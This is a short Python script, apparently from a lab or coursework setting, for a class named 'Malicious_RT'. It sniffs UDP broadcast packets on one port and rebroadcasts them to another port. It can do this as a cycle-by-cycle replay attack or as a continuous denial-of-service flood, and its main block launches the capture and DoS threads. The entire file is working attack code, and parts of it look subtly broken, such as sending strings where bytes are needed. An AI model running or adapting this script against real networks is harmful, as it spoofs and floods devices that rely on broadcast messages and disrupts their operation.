import threading
import time
import socket


class Malicious_RT:

    cycle_list = list()
    captured_packets = list()
    
    def record_packets(self, data):
        self.cycle_list.append(str(data))
    
    def capture_packets(self):
        s = \
            socket.socket(
                socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        s.bind(("", 2001))

        while True:
            data, addr = s.recvfrom(1024)
            self.record_packets(str(data))
    
    def replay_attack(self):
        check_flag = 0
        while True:
            time.sleep(10)
            if self.captured_packets:
                print("Performing Replay attack")
                # for i in self.captured_packets:
                #    print("Sending ", i)
                packet_check = self.captured_packets.pop(0)
                if packet_check[:3] == '100':
                    self.send_packet(packet_check)
                    packet_check = self.captured_packets.pop(0)
                    while (packet_check[:3] == '001'):
                        self.send_packet(packet_check)
                        if self.captured_packets:
                            packet_check = self.captured_packets.pop(0)
                        else:
                            packet_check = '000'
                    if packet_check[:3] == '100':
                        self.captured_packets.insert(0, packet_check)
                    print("Replay of 1 cycle done")
    
    def dos_attack(self):
        if self.captured_packets:
            print("Performing DoS attack")
        while True:
            time.sleep(1)
            for captured_packet in self.captured_packets:
                self.send_packet(captured_packet)
        return

    def show_packets(self):
        while True:
            if capture_agent.cycle_list:
                # print(capture_agent.cycle_list)
                self.captured_packets.append(capture_agent.cycle_list[0])
                capture_agent.cycle_list = list()
                # capture_agent.replay_attack()

    def send_packet(self, message):
        destination_ip = "255.255.255.255"
        destination_port = 2000
        socket_variable = \
            socket.socket(
                socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        socket_variable.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        socket_variable.sendto(message, (destination_ip, destination_port))        


if __name__ == "__main__":
    capture_agent = Malicious_RT()
    capture_thread = threading.Thread(
        target=capture_agent.capture_packets
    )
    capture_thread.start()

    display_thread = threading.Thread(
        target=capture_agent.show_packets
    )
    display_thread.start()
    
    replay_thread = threading.Thread(
        target=capture_agent.replay_attack
    )
#    replay_thread.start()

    dos_thread = threading.Thread(
        target=capture_agent.dos_attack
    )
    dos_thread.start()